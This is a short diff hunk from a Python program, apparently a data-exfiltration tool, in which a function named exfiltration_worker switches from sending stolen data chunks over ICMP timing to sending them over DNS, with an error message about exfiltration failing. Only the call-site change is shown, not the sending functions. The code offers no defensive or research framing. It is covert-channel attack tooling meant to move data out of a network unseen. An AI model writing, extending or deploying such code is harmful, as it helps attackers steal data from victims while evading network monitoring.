@@ -31,7 +31,8 @@ def exfiltration_worker():
         try:
             # Current active method: ICMP Timing
             # To switch to DNS, change this to send_data_over_dns(data_chunk)
-            send_data_over_icmp(data_chunk)
+            #send_data_over_icmp(data_chunk)
+            send_data_over_dns(data_chunk)
         except Exception as e:
             print(f"[-] Exfiltration Error: {e}")
             
